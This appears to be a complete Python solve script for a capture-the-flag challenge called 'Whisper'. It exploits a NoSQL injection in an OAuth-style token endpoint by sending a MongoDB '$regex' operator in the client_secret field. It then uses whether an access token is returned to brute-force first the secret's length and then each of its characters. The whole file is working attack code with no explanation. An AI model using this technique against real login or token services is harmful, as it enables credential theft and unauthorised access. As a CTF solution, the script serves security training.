# Whisper — hiCTF (script de solve)
import requests,re
U="https://whisper-01b71f0e227a.chall.hiddeninvestigations.net/api/token"
s=requests.Session()
def matches(regex,cid="report-signer"):
    r=s.post(U,json={"client_id":cid,"client_secret":{"$regex":regex}},timeout=12)
    return "access_token" in r.text
def esc(c): return re.escape(c)
# find length
import sys
length=None
for n in range(1,80):
    if matches("^.{%d}$"%n): length=n; break
print("length:",length)
charset="0123456789abcdefABCDEF-_ghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZ!@#$%^&*+=./:"
secret=""
while len(secret)<(length or 64):
    found=False
    for c in charset:
        if matches("^"+re.escape(secret+c)):
            secret+=c; found=True; print(secret,flush=True); break
    if not found:
        print("stuck at",secret); break
print("SECRET:",repr(secret))
